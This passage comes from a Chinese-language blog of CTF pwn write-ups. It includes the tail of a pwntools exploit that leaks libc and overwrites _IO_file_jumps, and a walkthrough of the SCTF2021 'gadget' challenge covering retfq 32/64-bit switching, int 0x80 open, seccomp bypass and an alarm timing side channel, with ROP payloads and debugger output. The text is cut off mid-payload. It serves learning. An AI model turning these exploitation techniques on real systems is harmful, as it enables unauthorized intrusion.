nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x50</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27; to ?\n&gt;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">2272</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;the length of the shortest path is &#x27;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>])-libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>])</span><br><span class="line">    <span class="comment">#io=libc_base+0x1ec8a0+0x38</span></span><br><span class="line">    io=libc_base+libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]+<span class="number">0x28</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(io)</span><br><span class="line"></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many nodes?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;how many edges?\n&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>((io-dist_addr)/<span class="number">8</span>))</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(dock_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;you want to start from which node?\n&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    <span class="comment">#sh.sendlineafter(&#x27; to ?\n&gt;&gt;&#x27;,&#x27;1&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;the length of the shortest path is &#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;how many nodes?\n&gt;&gt; &#x27;,&#x27;2&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;how many edges?\n&gt;&gt; &#x27;,&#x27;1&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;input edges in the\n[from] [to] [distant]\nformat&#x27;)</span></span><br><span class="line">    <span class="comment"># sh.sendline(str(1))</span></span><br><span class="line">    <span class="comment"># sh.sendline(&#x27;-2217&#x27;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">    <span class="comment"># sh.sendline(str(bss_addr+0x100+0xd8+0x38))</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27;you want to start from which node?\n&gt;&gt; &#x27;,str(0x10))</span></span><br><span class="line">    <span class="comment"># sh.sendlineafter(&#x27; to ?\n&gt;&gt;&#x27;,str(-2272))</span></span><br><span class="line">    <span class="comment"># sh.recvuntil(&#x27;the length of the shortest path is &#x27;)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è°ƒè¯•ç¨‹åºè¶Šæ¥è¶Šç†Ÿç»ƒäº†ï¼Œé€šè¿‡è°ƒè¯•printfå‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ä¹Ÿç›´è§‚äº†è§£äº†è™šè¡¨çš„ä½œç”¨ï¼Œä»¥åèƒ½ä»»æ„å†™é™¤äº†gotè¡¨å’Œexitï¼Œè¿˜èƒ½æ”¹å†™è™šè¡¨æ‹¿shelläº†ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/20/sctf2021-gadget/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/20/sctf2021-gadget/" class="post-title-link" itemprop="url">sctf2021 gadget</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-01-20 18:32:48 / ä¿®æ”¹æ—¶é—´ï¼š18:37:19" itemprop="dateCreated datePublished" datetime="2022-01-20T18:32:48+08:00">2022-01-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="sctf2021-gadget"><a href="#sctf2021-gadget" class="headerlink" title="sctf2021 gadget"></a>sctf2021 gadget</h1><p>çŸ¥è¯†ç‚¹ï¼š64ä½ç¨‹åºè½¬32ä½ï¼Œä¸‰åäºŒä½ä½¿ç”¨int80è°ƒç”¨openï¼Œalarmä¾§ä¿¡é“æ”»å‡»</p>
<p>åšè¿‡çš„æœ€éš¾çš„æ„é€ ropé¢˜ç›®äº†ï¼Œä½†å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œç”¨äº†å¿«ä¸¤å¤©æ‰å¤ç°æˆåŠŸï¼Œè¿™é“é¢˜èƒ½æœåˆ°çš„wpå°±ä¸¤ä¸ªï¼Œè€Œä¸”åªæœ‰è„šæœ¬ï¼Œæ²¡æœ‰å¤šå°‘è®²è§£ï¼Œæˆ‘æ˜¯ç¡¬ç€å¤´çš®çœ‹è„šæœ¬ä¸€æ­¥æ­¥åŠ¨æ€è°ƒè¯•æ‰ææ˜ç™½ï¼Œæ‰€ä»¥è¿™ç¯‡wpæˆ‘ä¼šå†™çš„ç»†ä¸€ç‚¹ï¼Œä¸€æ–¹é¢æœ‰å¯èƒ½å¯¹å…¶ä»–äººæœ‰ç”¨ï¼ˆå‡ ä¹ä¸å¯èƒ½ï¼‰ï¼Œä¸€æ–¹é¢åŠ æ·±æˆ‘çš„ç†è§£ã€‚</p>
<h2 id="64ä½ç¨‹åºè½¬32ä½"><a href="#64ä½ç¨‹åºè½¬32ä½" class="headerlink" title="64ä½ç¨‹åºè½¬32ä½"></a>64ä½ç¨‹åºè½¬32ä½</h2><p>ç¨‹åºè¿è¡Œèµ·æ¥æ—¶ï¼Œä¸“é—¨æœ‰ä¸€ä¸ªå¯„å­˜å™¨csæ¥å†³å®šåˆ°åº•æ˜¯ä»¥64ä½è¿è¡Œè¿˜æ˜¯ä»¥32ä½è¿è¡Œï¼Œå½“csä¸º0x33æ—¶ï¼Œç¨‹åºä»¥64ä½è¿è¡Œï¼Œå½“csæ˜¯0x23æ—¶ç¨‹åºä»¥32ä½è¿è¡Œï¼Œè¿™ä¸ªå¯„å­˜å™¨å¹¶ä¸æ˜¯ä¸èƒ½æ›´æ”¹çš„ï¼Œä¸“é—¨æœ‰ä¸ªæŒ‡ä»¤retfqç”¨æ¥æ›´æ”¹csï¼Œæœ€å…³é”®çš„æ˜¯retfqè¿˜æœ‰è·³è½¬åŠŸèƒ½ï¼Œé‚£å°±ä»£è¡¨ç»„æˆæ”»å‡»é“¾ã€‚</p>
<p>retfqæœ‰ä¸‰æ­¥æ“ä½œï¼ˆå°±ç»“æœè€Œè¨€ï¼‰ï¼Œå…ˆè®¾ç½®csä¸º[rsp+0x8]ï¼Œç„¶årsp+0x10,ç„¶åè·³è½¬åˆ°rsp-0x10,è¿™æ ·è¯´å¯èƒ½æœ‰ç‚¹æŠ½è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨gadgetæ¥å®æ“ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)+p32(pop_rax)</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨è¿™é‡Œä¸‹æ–­ç‚¹è¿è¡Œ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x409d1c &lt;__futexwait+113&gt;    pop    rsp</span><br><span class="line">   0x409d1d &lt;__futexwait+114&gt;    mov    edi, 0x88bf2838</span><br><span class="line">   0x409d22 &lt;__futexwait+119&gt;    ret    </span><br><span class="line">    â†“</span><br><span class="line"> â–º 0x4011ec &lt;main+28&gt;            retfq  </span><br><span class="line">    â†“</span><br><span class="line">   0x4011ec &lt;main+28&gt;            retfq  </span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp 0x40d010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0x401002 (_init+2) â—‚â€” ret    </span><br><span class="line">01:0008â”‚     0x40d018 â—‚â€” 0x23 /* &#x27;#&#x27; */</span><br><span class="line">02:0010â”‚     0x40d020 (__dso_handle) â—‚â€” 0x500401001</span><br><span class="line">03:0018â”‚     0x40d028 (__dso_handle+8) â—‚â€” 0x40d00000403072 /* &#x27;r0@&#x27; */</span><br><span class="line">04:0020â”‚     0x40d030 (install_seccomp.filter) â—‚â€” 0x40d0000040d000</span><br><span class="line">05:0028â”‚     0x40d038 (install_seccomp.filter+8) â—‚â€” 0x40117b0040d000</span><br><span class="line">06:0030â”‚     0x40d040 (install_seccomp.filter+16) â—‚â€” 0x4011f300000000</span><br><span class="line">07:0038â”‚     0x40d048 (install_seccomp.filter+24) â—‚â€” 0x401002004011ec</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶è¦æ‰§è¡Œretfqæ—¶çš„æŒ‡ä»¤åŒºå’Œæ ˆåŒºï¼Œæ‰§è¡Œå®Œåå°±å˜æˆè¿™æ ·äº†ã€‚</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> â–º 0x401002 &lt;_init+2&gt;    ret    &lt;0x500401001&gt;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ rsp 0x40d020 (__dso_handle) â—‚â€” 0x500401001</span><br><span class="line">01:0008â”‚     0x40d028 (__dso_handle+8) â—‚â€” 0x40d00000403072 /* &#x27;r0@&#x27; */</span><br><span class="line">02:0010â”‚     0x40d030 (install_seccomp.filter) â—‚â€” 0x40d0000040d000</span><br><span class="line">03:0018â”‚     0x40d038 (install_seccomp.filter+8) â—‚â€” 0x40117b0040d000</span><br><span class="line">04:0020â”‚     0x40d040 (install_seccomp.filter+16) â—‚â€” 0x4011f300000000</span><br><span class="line">05:0028â”‚     0x40d048 (install_seccomp.filter+24) â—‚â€” 0x401002004011ec</span><br><span class="line">06:0030â”‚     0x40d050 (install_seccomp.filter+32) â—‚â€” 0x40100100000033 /* &#x27;3&#x27; */</span><br><span class="line">07:0038â”‚     0x40d058 (install_seccomp.filter+40) â—‚â€” 0x0</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶rspå·²ç»åŠ 10ï¼Œè¦æ‰§è¡Œçš„æŒ‡ä»¤ä¹Ÿæ˜¯æ­¤æ—¶çš„rsp-0x10,å³æˆ‘ä»¬æ„é€ çš„ret,rspä¹Ÿæ˜¯æˆ‘ä»¬æ„é€ çš„gadgetçš„æŒ‡ä»¤ï¼Œè¿™æ ·æ”»å‡»é“¾å°±è¿ä¸Šäº†ï¼ˆè·³è½¬åŠŸèƒ½ï¼‰ã€‚</p>
<h2 id="ä¸‰åäºŒä½ä½¿ç”¨int80è°ƒç”¨open"><a href="#ä¸‰åäºŒä½ä½¿ç”¨int80è°ƒç”¨open" class="headerlink" title="ä¸‰åäºŒä½ä½¿ç”¨int80è°ƒç”¨open"></a>ä¸‰åäºŒä½ä½¿ç”¨int80è°ƒç”¨open</h2><p>64ä½ç³»ç»Ÿè°ƒç”¨openå’Œ32ä½ç³»ç»Ÿè°ƒç”¨openå‡½æ•°çš„å¯„å­˜å™¨å¸ƒç½®å¹¶ä¸ç›¸åŒï¼Œç½‘ä¸Šä¹Ÿæ²¡ä»€ä¹ˆèµ„æ–™ï¼Œæœäº†å¥½ä¹…ç„¶åé—®äº†ayoungä½¬æ‰ææ‡‚ã€‚åœ¨64ä½ç³»ç»Ÿè°ƒç”¨æ—¶è¦å¸ƒç½®rax,rdi,rsi,rbxå››ä¸ªå‚æ•°ï¼Œraxæ˜¯ç³»ç»Ÿè°ƒç”¨å·ï¼Œåé¢ä¸‰ä¸ªæ˜¯å‚æ•°ï¼Œåœ¨32ä½ç³»ç»Ÿè°ƒç”¨æ—¶æ˜¯å¸ƒç½®ecx,eax,ebx,edx,å››ä¸ªå‚æ•°çš„ä½œç”¨å¦‚ä¸‹å›¾å¦‚ä¸‹å›¾ï¼Œå…¶ä¸­eax,ebxå¿…é¡»éå¸¸ä¸¥è°¨ï¼Œecså’Œedxå¸ƒä¸å¸ƒç½®éƒ½è¡Œï¼Œä½†ecxä¸º0ä¼šæé«˜æˆåŠŸç‡ï¼ˆå¥‡æ€ªçš„çŸ¥è¯†ï¼‰ï¼Œæ‰€ä»¥æœ€å¥½è¿˜æ˜¯å¸ƒç½®ecxã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220119222532362.png" alt="image-20220119222532362"></p>
<p>åœ¨32ä½ç¨‹åºä¸­ç³»ç»Ÿè°ƒç”¨å¹¶ä¸æ˜¯syscallï¼ˆè€Œä¸”å¹¶ä¸å­˜åœ¨ï¼‰ï¼Œè€Œæ˜¯int80æŒ‡ä»¤ï¼Œé€‰æ‹©gadgetçš„æ—¶å€™æœ€å¥½é€‰æ‹©int80;retï¼ˆå¦‚æœåé¢è¿˜æœ‰ropè¦æ‰§è¡Œçš„è¯ï¼‰,</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int 80;ret</span><br></pre></td></tr></table></figure>

<h2 id="alarmä¾§ä¿¡é“æ”»å‡»"><a href="#alarmä¾§ä¿¡é“æ”»å‡»" class="headerlink" title="alarmä¾§ä¿¡é“æ”»å‡»"></a>alarmä¾§ä¿¡é“æ”»å‡»</h2><p>alarmå‡½æ•°æ˜¯ç¨‹åºçš„ä¸€ä¸ªè®¡æ—¶å‡½æ•°ï¼Œæ¯”å¦‚ç¨‹åºåˆšå¼€å§‹è°ƒç”¨alarm(10)ï¼Œé‚£è¿™ä¸ªå‡½æ•°ä»è¿™ä¸ªæ—¶é—´ç‚¹å¼€å§‹åªèƒ½å†æ‰§è¡Œåç§’é’Ÿ</p>
<p>åˆ©ç”¨æ€è·¯ï¼šå¯ä»¥æŠŠflagçš„æ¯ä¸ªå­—ç¬¦movç»™rdiåè°ƒç”¨alarmå‡½æ•°ï¼Œä»alarmå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™è®¡æ—¶ï¼Œç„¶åæ£€æµ‹ç¨‹åºçš„ç»“æŸæ—¶é—´ï¼Œç»“æŸæ—¶é—´å‡å»å¼€å§‹æ—¶é—´å°±æ˜¯rdiçš„å€¼å³flagçš„æ¯ä¸ªå­—ç¬¦çš„å€¼ã€‚</p>
<h4 id="é‡ç‚¹ï¼šå½“æ‰§è¡Œå®Œalarmå‡½æ•°åå¾—è®©ç¨‹åºé™·å…¥æ­»å¾ªç¯ï¼Œä¸ç„¶æ‰§è¡Œå®Œalarmå‡½æ•°å°±ç›´æ¥é€€å‡ºç¨‹åºäº†ï¼Œä¸èƒ½è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®çš„ï¼Œæ¯”å¦‚è¿™ä¸ªrop"><a href="#é‡ç‚¹ï¼šå½“æ‰§è¡Œå®Œalarmå‡½æ•°åå¾—è®©ç¨‹åºé™·å…¥æ­»å¾ªç¯ï¼Œä¸ç„¶æ‰§è¡Œå®Œalarmå‡½æ•°å°±ç›´æ¥é€€å‡ºç¨‹åºäº†ï¼Œä¸èƒ½è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®çš„ï¼Œæ¯”å¦‚è¿™ä¸ªrop" class="headerlink" title="é‡ç‚¹ï¼šå½“æ‰§è¡Œå®Œalarmå‡½æ•°åå¾—è®©ç¨‹åºé™·å…¥æ­»å¾ªç¯ï¼Œä¸ç„¶æ‰§è¡Œå®Œalarmå‡½æ•°å°±ç›´æ¥é€€å‡ºç¨‹åºäº†ï¼Œä¸èƒ½è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®çš„ï¼Œæ¯”å¦‚è¿™ä¸ªrop"></a>é‡ç‚¹ï¼šå½“æ‰§è¡Œå®Œalarmå‡½æ•°åå¾—è®©ç¨‹åºé™·å…¥æ­»å¾ªç¯ï¼Œä¸ç„¶æ‰§è¡Œå®Œalarmå‡½æ•°å°±ç›´æ¥é€€å‡ºç¨‹åºäº†ï¼Œä¸èƒ½è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„ç›®çš„ï¼Œæ¯”å¦‚è¿™ä¸ªrop</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(alarm)+p64(<span class="number">0</span>)+p64(pop_rsi_r15_rbp)+p64(push_rsi_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(push_rsi_ret)</span><br></pre></td></tr></table></figure>

<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>checksecåˆ†æ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/rootzhang/get-shell/sctf2021/gadget/gadget&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>æ²™ç›’åˆ†æ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/sctf2021/gadget$ seccomp-tools dump ./gadget</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x03 0x00 0x40000000  if (A &gt; 0x40000000) goto 0005</span><br><span class="line"> 0002: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0006</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000025  if (A == alarm) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>åªå…è®¸è°ƒç”¨fstat(32ä½ä¸‹çš„openå‡½æ•°),readå‡½æ•°å’Œalarmå‡½æ•°ï¼Œä»è¿™é‡Œå°±å¯ä»¥çœ‹å‡ºåšé¢˜æ€è·¯äº†ï¼Œå…ˆ64ä½è½¬ä¸‰åäºŒä½è°ƒç”¨openå‡½æ•°è¯»flagï¼Œç„¶åå†è½¬æˆ64ä½è°ƒç”¨readå‡½æ•°æŠŠflagå†™åˆ°ç¨‹åºé‡Œï¼Œç„¶åalarmä¾§ä¿¡é“çˆ†ç ´</p>
<p>idaåæ±‡ç¼–</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">44</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  alarm_sys(<span class="number">48LL</span>, argv, envp);</span><br><span class="line">  install_seccomp(<span class="number">48LL</span>, (__int64)argv, v3, v4, v5, v6);</span><br><span class="line">  read_sys(v9);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)&amp;locret_401002;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">read_sys</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sys_read(<span class="number">0</span>, a1, <span class="number">0xC0</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¨‹åºéå¸¸ç®€å•æ²¡æœ‰canaryè¿˜æœ‰æº¢å‡ºï¼Œé‚£å°±ç›´æ¥æº¢å‡ºæ„é€ ropå®Œæˆæ”»å‡»æ€è·¯ï¼Œæ³¨æ„ropéå¸¸é•¿æ‰€ä»¥å¾—è¿›è¡Œæ ˆè¿ç§»æ‰è¡Œã€‚</p>
<p>ç¬¬ä¸€æ­¥è°ƒç”¨readå‡½æ•°æŠŠropå†™åˆ°bssæ®µç„¶åæ ˆè¿ç§»åˆ°è¿™é‡Œ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)+p64(bss_base)</span><br><span class="line">payload+=p64(pop_r12_r14_r15_rbp)+p64(<span class="number">0x300</span>)+p64(sys_read)+p64(bss_base)+p64(bss_base)</span><br><span class="line">payload+=p64(mov_rsi_rdx_call_r14)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">0x8</span>)</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ­¥retfqåè°ƒç”¨openå‡½æ•°è¯»flagæ–‡ä»¶ï¼Œç„¶åå†retfqåè°ƒç”¨readå‡½æ•°æŠŠflagå†™åˆ°bssæ®µï¼Œç„¶åå†è°ƒç”¨readå‡½æ•°è¿›æ ˆè¿ç§»</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;./flag\x00\x00&#x27;</span>+p64(retfq)+p64(ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">payload+=p32(pop_rax)+p32(<span class="number">5</span>)+p32(pop_rbx_r14_r15_rbp)+p32(bss_base)*<span class="number">4</span></span><br><span class="line">payload+=p32(pop_rcx)+p32(<span class="number">0</span>)+p32(int80_ret)+p32(retfq)+p32(ret)</span><br><span class="line">payload+=p32(<span class="number">0x33</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi_rbp)+p64(<span class="number">3</span>)+p64(bss_base)</span><br><span class="line">payload+=p64(sys_ret)+p64(pop_rdi_rbp)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rsi_r15_rbp)</span><br><span class="line">   payload+=p64(bss_base+<span class="number">1</span>+num+)*<span class="number">2</span>+p64(bss_base+<span class="number">8</span>+num+)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(sys_ret)+p64(pop_rsp_mov_edi)+p64(bss_base+<span class="number">8</span>+num+)</span><br><span class="line">paylaod=payload.ljust(<span class="number">0x300</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

